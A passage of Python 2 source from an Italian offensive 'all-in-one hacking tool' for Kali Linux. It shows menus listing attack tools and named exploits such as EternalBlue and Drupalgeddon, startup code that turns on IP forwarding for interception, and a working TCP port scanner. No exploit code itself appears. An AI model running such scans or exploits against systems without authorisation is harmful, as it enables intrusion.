        print(random.choice(rdm_err))
        return menu()

def help():
    try:
        print("")
        print("-# %sComandi%s:                         -# %sDescrizione%s:                                "%(bright_green+underline,end, bright_green+underline,end))
        print(" $ help                                Mostra questa schermata                             ") ; sleep(.01)
        print(" $ banner                              Mostra il banner                                    ") ; sleep(.01)
        print(" $ show tools                          Vedi tutti i tools                                  ") ; sleep(.01)
        print(" $ show exploits                       Vedi tutti gli exploits                             ") ; sleep(.01)
        print(" $ reload / stop                       Ricarica / Ferma i servizi                          ") ; sleep(.01)
        print(" $ restart                             Riavvia il programma                                ") ; sleep(.01)
        print(" $ netinfo                             Informazioni di rete                                ") ; sleep(.01)
        print(" $ net_restart                         Riavvia il servizio network-manager                 ") ; sleep(.01)
        print(" $ search <tool>                       Cerca se un tool Ã¨ installato                       ") ; sleep(.01)
        print(" $ os     <comando>                    Esegui <comando> nel terminale                      ") ; sleep(.01)
        print(" $ dig    <indirizzo>                  Reverse IP lookup                                   ") ; sleep(.01)
        print(" $ getip  <indirizzo>                  Ottieni l'indirizzo IP da <indirizzo>               ") ; sleep(.01)
        print(" $ quit / exit / Ctrl+C                Esci                                                ") ; sleep(.01)
        print("")
        return menu()
    except KeyboardInterrupt:
        print("\n")
        return menu()
def show_tools():
    try:
        print("")
        print("-# %sSniffing & Spoofing%s:                                                                "%(bright_green+underline,end))
        print(" $ bettercap - ettercap - morpheus - pcredz - mitmf - p0f   - netool  - voiphopper         ") ; sleep(.01)
        print(" $ wireshark - cdpsnarf - sslstrip - mitmap - cookie-cadger - bluelog - driftnet           ") ; sleep(.01)
        print(" $ torghost  - macchanger                                                                  ") ; sleep(.01)
        print("")
        print("-# %sPassword-Attacks%s:                                                                   "%(bright_green+underline, end))
        print(" $ hashcrack  - findmyhash - dymerge - gen2kr - ophcrack                                   ") ; sleep(.01)
        print(" $ hashbuster - ioscrack   - hash-identifier  - cupp                                       ") ; sleep(.01)
        print("")
        print("-# %sVulnerability-Scanners%s:                                                             "%(bright_green+underline,end))
        print(" $ xsstrike - dtect - wascan - xsstracer - droopescan - sn1per  - owscan                   ") ; sleep(.01)
        print(" $ joomscan - nikto - wpscan - xsssniper - witchxtool - sslscan - vbscan                   ") ; sleep(.01)
        print(" $ webpwn3r - fimap - sslyze - webscarab - clusterd   - zaproxy - dsxs                     ") ; sleep(.01)
        print(" $ skipfish - a2sv  - wapiti - red_hawk  - wafw00f    - arachni - vega                     ") ; sleep(.01)
        print("")
        print("-# %sInformation-Gathering%s:                                                              "%(bright_green+underline,end))
        print(" $ wig   - geoip   - credmap - theharvester - infoga - dotdotpwn - cutycapt  - knockmail   ") ; sleep(.01)
        print(" $ dirb  - whois   - whatweb - urlextractor - cpscan - sublist3r - breacher  - 0trace      ") ; sleep(.01)
        print(" $ zmap  - inspy   - parsero - smtpuserenum - dhcpig - automater - xattacker - xprobe      ") ; sleep(.01)
        print(" $ drup  - sechub  - sshscan - angryfuzzer  - tulpar - snmpcheck - recon-ng  - oscanner    ") ; sleep(.01)
        print(" $ nmap  - maltego - ip2host - netdiscover  - dnsmap - fuckscrap - devploit  - portscan    ") ; sleep(.01)
        print(" $ amap  - miranda - dnsenum - instarecon   - bingoo - btscanner - pentmenu                ") ; sleep(.01)
        print(" $ v3n0m - uniscan - intrace - ciscotorch   - dmitry - leviathan - cr3dov3r                ") ; sleep(.01)
        print(" $ crips - angryip - sfinder - operativef   - zenmap - dirbuster - serenity                ") ; sleep(.01)
        print("")
        print("-# %sWeb-Hacking%s:                                                                        "%(bright_green+underline,end))
        print(" $ sqlmap - sqldict - t50   - zambie - brutesploit - blackhydra - icloudbrutter            ") ; sleep(.01)
        print(" $ commix - httrack - jsql  - xhydra - metagoofil  - instaburst - goldeneye                ") ; sleep(.01)
        print(" $ medusa - cheetah - siege - ufonet - torshammer  - burpsuite  - thcssldos                ") ; sleep(.01)
        print(" $ xerxes - ipmipwn - blazy - brutex - powerfuzzer - nosqlmap   - hping3                   ") ; sleep(.01)
        print("")
        print("-# %sWireless-Attacks%s:                                                                   "%(bright_green+underline,end))
        print(" $ airgeddon - wpsbreaker - fluxion  - wifiphisher                                         ") ; sleep(.01)
        print(" $ netattack - wifijammer - fakeauth - wifite                                              ") ; sleep(.01)
        print("")
        print("-# %sExploitation-Tools%s:                                                                 "%(bright_green+underline,end))
        print(" $ routersploit - eggshell - debinject - beelogger - l0l - xspy - arcanus - koadic         ") ; sleep(.01)
        print(" $ overthruster - pybomber - zirikatu  - pentestly - msfconsole - astroid - weeman         ") ; sleep(.01)
        print(" $ printerspam  - yersinia - armitage  - intersect - termineter - saint   - ngrok          ") ; sleep(.01)
        print(" $ microsploit  - ezsploit - setoolkit - evildroid - darksploit - fatrat  - jboss          ") ; sleep(.01)
        print(" $ shellsploit  - kautilya - responder - pastezort - socialfish - brutal  - parat          ") ; sleep(.01)
        print(" $ onelin3r     - ciscoge  - chaos - kayak - u3pwn - wirespy    - eflood  - wole           ") ; sleep(.01)
        print("")
        print("-# %sAll-In-One%s:                                                                         "%(bright_green+underline, end))
        print(" $ hakkuf - sb0x - inguma - discover - websploit  - simple-ducky                           ") ; sleep(.01)
        print(" $ atscan - zarp - penbox - dzjecter - ktfconsole - trity                                  ") ; sleep(.01)
        print("")
        print("-# %sOthers%s:                                                                             "%(bright_green+underline,end))
        print(" $ cmospwd - rkhunter - lynis - searchsploit                                               ") ; sleep(.01)
        print("")
        return menu()
    except KeyboardInterrupt:
        print("\n")
        return menu()
def show_exploits():
    try:
        print("")
        print("-# %sWindows%s:         -# %sDescrizione%s:                                                "%(bright_green+underline,end, bright_green+underline,end))
        print(" $ eternalromance      Attacca il protocollo SMB su Windows XP-7            (Porta 445)    ") ; sleep(.01)
        print(" $ eternalblue         Attacca i protocolli SMBv1 e SMBv2 su Windows XP-7   (Porta 445)    ") ; sleep(.01)
        print(" $ manageengine        Attacca ManageEngine Application Manager             (Porta 9090)   ") ; sleep(.01)
        print(" $ esteemaudit         Attacca il sistema Windows XP-2003 Server            (Porta 3389)   ") ; sleep(.01)
        print(" $ unauth_rce          Attacca il sistema HPE iMC                           (Porta 2810)   ") ; sleep(.01)
        print(" $ webdav              Attacca il sistema Windows Server 2003         (RDP) (Porta 80/443) ") ; sleep(.01)
        print(" $ netapi              Attacca il protocollo SMB su Windows XP-2003 Server  (Porta 445)    ") ; sleep(.01)
        print("")
        print("-# %sAndroid%s:                                                                            "%(bright_green+underline,end))
        print(" $ webview             AddJavascriptInterface Code Execution                (Android 4.1.2)") ; sleep(.01)
        print(" $ knox_smdm           Usa una pagina web per installare un apk maligno  (S4,S5,Note3,Ace4)") ; sleep(.01)
        print("")
        print("-# %sLinux%s:                                                                              "%(bright_green+underline,end))
        print(" $ samba_pipename      Attacca il protocollo Samba          (Shared Folder) (Porta 445)    ") ; sleep(.01)
        print(" $ samba_usermap       Attacca il protocollo Samba           (3.0.20-25rc3) (Porta 445)    ") ; sleep(.01)
        print(" $ shellshock          Attacca sfruttando la vulnerabilitÃ  ShellShock       (Porta 80/443) ") ; sleep(.01)
        print(" $ jexboss             Multi-Exploiter locale e web                                        ") ; sleep(.01)
        print("")
        print("-# %sOthers%s:                                                                             "%(bright_green+underline,end))
        print(" $ joomla_comfields    Sfrutta una vulnerabilitÃ  SQLi nel componente com_fields (v3.7.0)   ") ; sleep(.01)
        print(" $ drupalgeddon        Attacca i sistemi vulnerabili che usano drupal           (v7-8)     ") ; sleep(.01)
        print(" $ bluesnarfer         Prendi il controllo dei dispositivi bluetooth                       ") ; sleep(.01)
        print(" $ tomcat_jsp          Attacca Apache Tomcat                                (Porta 8080)   ") ; sleep(.01)
        print(" $ handler             Avvia un handler locale con MSF                                     ") ; sleep(.01)
        print("")
        return menu()
    except KeyboardInterrupt:
        print("\n")
        return menu()
def startup():
    logo = "-# Welcome To %sFuck Society%s ~ %s\n"%(red,end, autore)
    for l in logo:
        try:
            sys.stdout.write("%s"%(l))
            sys.stdout.flush()
            time.sleep(.016)
        except KeyboardInterrupt:
            sys.exit("\n\n%s-# (%s-%s) Sei davvero una brutta persona...\n"%(end, red,end))
    car = "-# Avvio i servizi "
    for l in car:
        try:
            sys.stdout.write("%s"%(l))
            sys.stdout.flush()
            time.sleep(.016)
        except KeyboardInterrupt:
            sys.exit("\n\n%s-# (%s-%s) Sei davvero una brutta persona...\n"%(end, red,end))
    os.system("updatedb")
    os.system("service postgresql start")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    try:
        time.sleep(.1)
    except KeyboardInterrupt:
        exit()
    sys.stdout.write("- %sOK%s\n\n"%(bright_green,end))
    sys.stdout.flush()
    print("")
    if os.path.isfile("output/fsociety/booted") == False:
        os.system("echo 'file destinato al macello' > output/fsociety/booted")
    return menu()
def logo_menu():
    sys.stdout.write(end)
    sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=28, cols=91))
    os.system("reset")
    banner()
    if os.path.isfile("output/fsociety/booted"):
        return menu()
    startup()
def banner():
    try:
        from bin import banners
        loadbanner = banners.banners
        banner = random.choice(loadbanner)
        banner = banner.splitlines()
        for l in banner:
            print l
            time.sleep(.02)
        print("                 --+=[ Fuck Society > %sAll-in-one Hacking Tool%s        "%(red,end)); sleep(.02)
        print("                 --+=[ Versione     > %s                                 "%(versione)); sleep(.02)
        print("                 --+=[ Tools        > %s                                 "%(Tools)); sleep(.02)
        print("                 --+=[ Exploits     > %s                                 "%(Exploits)); sleep(.02)
        print("                 --+=[ Github       > %shttps://www.github.com/Skull00%s "%(red,end)); sleep(.02)
        print("\n")
    except KeyboardInterrupt:
        print("\n-# (%s-%s) Questo non mi Ã¨ piaciuto\n"%(red,end))

def exit():
    if os.path.isfile("bin/banners.pyc"):
        os.system("rm bin/*.pyc")
    if os.path.isfile("output/fsociety/booted"):
        os.system("rm output/fsociety/booted")
    sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=24, cols=80))
    os.system("clear")
    sys.stdout.write("\n-# Fermo i servizi ")
    sys.stdout.flush()
    os.system("service postgresql stop && echo 0 > /proc/sys/net/ipv4/ip_forward")
    sys.stdout.write("- %sOK%s\n\n"%(bright_green,end))
    sys.stdout.flush()
    sys.exit()
def firststartup():
    os.system("clear")
    print("""
-# %sCondizioni d'uso%s:
   Rubare dati, invadere la privacy delle persone, violare sistemi altrui e
   altro ancora sono reati perseguibili penalmente. Non mi assumo nessuna
   responsabilitÃ  per qualsiasi utilizzo illecito di questo programma.
   %sPensa prima di premere invio!%s
    """%(underline+bright_green,end, red,end))
    try:
        startup_cond = raw_input("-# (Premi invio per continuare) ")
        logo_menu()
    except (KeyboardInterrupt,EOFError):
        sys.exit("\n")

def check_conn():
    try:
        sys.stdout.write("-# Verifico connessione ")
        sys.stdout.flush()
        requests.get("https://www.google.com")
        sys.stdout.write("- %sOK%s\n"%(bright_green,end))
        sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        sys.stdout.write("- %sFail%s\n"%(red,end))
        sys.stdout.flush()
        print("-# Verifica la tua connessione e riprova")
        return menu()
    except KeyboardInterrupt:
        print("\n-# Interrotto")
        return menu()
def replacer(target):
    if "http://" in target:
        target = target.replace("http://","")
    if "https://" in target:
        target = target.replace("https://","")
def get_ip(target):
    try:
        target = socket.gethostbyname("%s"%(target))
    except socket.gaierror:
        print("-# (%s-%s) Indirizzo sconosciuto"%(red,end))
        return menu()
def check_port(port):
    try:
        if int(port) < 1 or int(port) > 65535:
            print("-# (%s-%s) Porta non valida"%(red,end))
            return menu()
    except ValueError:
        print("-# (%s-%s) Porta non valida"%(red,end))
        return menu()
def portscan(ip):
    try:
        requests.get("https://www.google.com")
    except requests.exceptions.ConnectionError:
        print("-# (%s-%s) Errore di connessione"%(red,end))
        return menu()
    except KeyboardInterrupt:
        print("-# Interrotto")
        return menu()
    checkwords = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
    "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g",
    "h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    for w in ip:
        if w in checkwords:
            if "http://" in ip: ip = ip.replace("http://","")
            if "https://" in ip: ip = ip.replace("https://","")
            break
    try: getip = socket.gethostbyname("%s"%(ip))
    except socket.gaierror:
        print("-# (%s-%s) Indirizzo sconosciuto"%(red,end))
        return menu()
    def before_menu(server):
        server.close()
        print("")
        return menu()
    ports_to_scan = [0,1,2,3,5,7,9,11,13,15,17,18,19,20,21,22,23,25,26,37,38,39,42,43,47,49,50,51,52,53,54,56,57,58,61,67,68,69,70,71,72,73,74,75,77,79,80,81,82,87,88,90,99,100,101,102,104,105,106,107,108,109,110,111,112,113,115,117,118,119,120,123,126,135,136,137,138,139,143,144,152,153,156,158,161,162,170,177,179,192,194,199,201,207,209,210,213,217,218,220,222,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,249,250,251,252,253,254,255,259,262,264,280,300,308,311,318,319,320,350,351,356,363,366,369,370,371,383,384,387,389,399,401,402,407,427,433,434,443,444,445,464,465,475,491,497,500,502,504,510,512,513,514,515,517,518,520,521,524,525,530,532,533,539,540,542,543,544,547,548,550,554,556,559,560,561,563,564,585,587,591,593,601,604,623,625,626,631,635,636,639,641,643,646,647,648,651,653,654,655,657,660,664,666,674,682,683,684,685,686,687,688,689,690,691,694,695,698,700,701,702,706,711,712,749,750,751,752,753,754,760,764,767,772,773,774,775,776,780,781,782,783,786,787,789,800,808,814,826,829,830,831,832,833,838,843,847,848,853,860,861,862,873,888,897,898,902,903,944,953,959,965,981,983,987,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1007,1008,1010,1011,1012,1013,1014,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1053,1054,1055,1056,1057,1058,1059,1060,1064,1065,1066,1067,1068,1069,1070,1071,1072,1080,1081,1085,1087,1088,1090,1098,1099,1100,1101,1105,1109,1110,1119,1124,1167,1194,1198,1200,1214,1220,1234,1241,1270,1293,1311,1314,1337,1341,1344,1346,1352,1360,1414,1417,1418,1419,1420,1431,1433,1434,1455,1457,1484,1485,1492,1494,1500,1501,1513,1521,1524,1527,1533,1547,1550,1581,1582,1583,1589,1604,1626,1627,1628,1629,1645,1646,1666,1677,1688,1701,1707,1716,1718,1719,1720,1723,1755,1761,1782,1783,1801,1804,1812,1813,1880,1883,1885,1886,1900,1901,1935,1967,1970,1972,1984,1985,1993,1998,2000,2001,2002,2005,2010,2033,2048,2049,2051,2056,2080,2082,2083,2086,2087,2095,2096,2100,2101,2102,2103,2104,2105,2107,2121,2123,2142,2148,2152,2159,2160,2161,2181,2195,2196,2210,2211,2221,2222,2223,2224,2225,2226,2261,2262,2266,2302,2303,2305,2343,2345,2351,2362,2368,2369,2370,2372,2375,2376,2377,2379,2380,2383,2399,2401,2404,2424,2427,2447,2480,2483,2484,2535,2541,2546,2547,2548,2593,2598,2599,2601,2638,2710,2717,2727,2809,2810,2811,2827,2869,2944,2945,2947,2948,2949,2967,3000,3001,3004,3020,3050,3052,3074,3101,3128,3130,3225,3233,3260,3268,3269,3283,3290,3296,3305,3306,3313,3316,3323,3332,3333,3343,3351,3386,3389,3396,3401,3412,3423,3424,3455,3456,3457,3659,3664,3478,3479,3480,3483,3493,3516,3527,3535,3544,3632,3645,3659,3667,3689,3690,3702,3703,3724,3725,3768,3784,3785,3799,3804,3825,3826,3830,3835,3856,3880,3868,3872,3900,3960,3962,3978,3979,3986,3999,4000,4001,4008,4018,4035,4045,4050,4069,4089,4090,4093,4096,4105,4111,4116,4125,4172,4190,4198,4201,4222,4226,4242,4243,4244,4303,4307,4321,4352,4444,4445,4486,4488,4500,4502,4503,4504,4505,4506,4507,4508,4509,4510,4511,4512,4513,4514,4515,4516,4517,4518,4519,4520,4521,4522,4523,4524,4525,4526,4527,4528,4529,4530,4531,4532,4533,4534,4560,4567,4569,4604,4605,4610,4611,4612,4613,4614,4615,4616,4517,4618,4619,4620,4621,4622,4623,4624,4625,4626,4627,4628,4629,4630,4631,4632,4633,4634,4635,4636,4637,4638,4639,4640,4662,4664,4666,4672,4711,4713,4728,4730,4739,4747,4750,4753,4789,4840,4843,4847,4894,4899,4949,4950,5000,5001,5002,5003,5009,5010,5050,5051,5060,5070,5093,5101,5104,5120,5121,5124,5125,5190,5222,5223,5228,5242,5351,5353,5355,5357,5358,5432,5500,5555,5631,5632,5666,5723,5800,5900,5901,6000,6001,6002,6004,6050,6112,6346,6347,6646,6970,6971,7000,7070,7937,7938,8000,8001,8008,8009,8010,8031,8080,8081,8181,8193,8443,8888,8900,9000,9001,9020,9090,9100,9102,9103,9199,9200,9370,9876,9877,9950,9999,10000,10010,10080,11487,16086,16402,16430,16680,16832,16918,16947,17091,17185,17219,17455,17459,17573,17615,17616,17754,17888,17939,17989,18004,18234,18331,18360,18449,18582,18835,18888,18980,19017,19039,19120,19130,19165,19197,19283,19294,19315,19322,19332,19489,19503,19541,19600,19616,19682,19687,19933,20003,20004,20019,20031,20126,20359,20389,21000,21131,21212,21261,21298,21354,21383,21621,21800,21803,21847,21902,22055,22341,22692,22695,22739,22799,22846,22914,22986,22996,23040,23176,23354,23531,23557,23608,23679,23781,23965,23980,24007,24242,24279,24511,24594,24606,24644,24854,24910,25003,25157,25240,25280,25337,25375,25462,25541,25546,25709,25931,26407,26415,26720,26872,26966,27002,27007,27015,27195,27444,27473,27482,27707,27892,27899,28122,28369,28465,28493,28543,28547,28641,28840,28973,29078,29243,29256,29810,29823,29977,30260,30263,30303,30365,30544,30656,30697,30704,30718,30975,31059,31073,31109,31134,31137,31155,31162,31180,31189,31195,31199,31202,31261,31266,31267,31284,31334,31335,31337,31343,31350,31352,31361,31365,31404,31412,31428,31481,31520,31521,31560,31569,31584,31599,31602,31609,31625,31673,31681,31692,31720,31731,31732,31735,31743,31750,31783,31792,31794,31803,31852,31882,31887,31891,31918,31963,31999,32044,32053,32066,32124,32129,32132,32185,32216,32219,32262,32273,32326,32345,32352,32359,32368,32382,32385,32404,32415,32422,32425,32430,32446,32469,32479,32495,32499,32506,32528,32546,32607,32611,32727,32750,32760,32768,32769,32770,32771,32772,32773,32774,32775,32776,32777,32778,32779,32780,32798,32815,32818,32931,33030,33249,33281,33354,33355,33459,33717,33744,33866,33872,34038,34079,34125,34358,34422,34433,34555,34570,34577,34578,34579,34580,34758,34796,34855,34861,34862,34892,35438,35702,35777,35794,36108,36206,36384,36458,36489,36669,36778,36893,36945,37144,37212,37393,37444,37602,37761,37783,37813,37843,38037,38063,38293,38412,38498,38615,39213,39217,39632,39683,39714,39723,39888,40019,40116,40441,40539,40622,40708,40711,40724,40732,40805,40847,40866,40915,41058,41081,41308,41370,41446,41524,41638,41702,41774,41896,41967,41971,42056,42172,42313,42431,42434,42508,42557,42577,42627,42639,43094,43195,43370,43514,43686,43824,43967,44101,44160,44179,44185,44190,44253,44334,44508,44923,44946,44968,45247,45380,45441,45685,45722,45818,45928,46093,46532,46836,47624,47765,47772,47808,47915,47981,48078,48189,48255,48455,48489,48761,49152,49153,49154,49155,49156,49157,49158,49159,49160,49161,49162,49163,49165,49166,49167,49168,49169,49170,49171,49172,49173,49174,49175,49176,49177,49178,49179,49180,49181,49182,49184,49185,49186,49187,49188,49189,49190,49191,49192,49193,49194,49195,49196,49197,49198,49199,49200,49201,49202,49204,49205,49207,49208,49209,49210,49211,49212,49213,49214,49215,49216,49220,49222,49226,49259,49262,49306,49350,49360,49393,49396,49503,49640,49968,50000,50099,50164,50497,50612,50708,50919,51255,51456,51554,51586,51690,51717,51905,51972,52144,52225,52503,53006,53037,53571,53589,53838,54094,54114,54281,54321,54711,54807,54925,55043,55544,55587,56141,57172,57409,57410,57813,57843,57958,57977,58002,58075,58178,58419,58631,58640,58797,59193,59207,59765,59846,60172,60381,60423,61024,61142,61319,61322,61370,61412,61481,61550,61685,61961,62154,62287,62575,62677,62699,62958,63420,63555,64080,64481,64513,64590,64727,65024]
    analyzed = 0
    opened = []
    socket.setdefaulttimeout(0.2)
    print("")
    def connCheck(ip, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            server.connect((ip, port))  # argument must be a tuple pair of ip address and port
            opened.append(port)
            server.close()
        except KeyboardInterrupt:
            server.close()
            print("")
            return before_menu(server)
        except:
            server.close()
            pass
    for port in ports_to_scan:
        try:
            analyzed += 1
            sys.stdout.write("\r-# Porte analizzate: %s/%s (Porta: %s) | Porte aperte: %s "%(analyzed, len(ports_to_scan), port, len(opened)))
            connCheck(ip,port)
            for e in opened:
                sys.stdout.write("[%s%s%s]"%(bright_green, e, end))
            sys.stdout.flush()
        except KeyboardInterrupt:
            continue
    print("\n-# Scansione completata\n")
    return menu()

if __name__ == "__main__":
    try:
        compatible = ["KaliLinux"]
        get_sys = platform.linux_distribution()[0] + platform.system()
        if get_sys not in compatible:
            print("-# (%s-%s) Spiacente, programma non compatibile col tuo sistema"%(red,end))
            print("-# Sistemi supportati:\n - Kali Linux".format(bright_green,end))
            sys.exit()
        biohazard = u"\u2623"
        sys.stdout.write("\x1b]2;"+biohazard+" Fuck Society "+biohazard+"\x07") # Titolo terminale
        sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=24, cols=80))
        try:
            installer_done = open("output/fsociety/completed")
            firststartup()
        except IOError:
            sys.exit("-# Esegui %sinstaller.py%s per usare il programma"%(bright_green,end))
    except KeyboardInterrupt:
        sys.exit("")
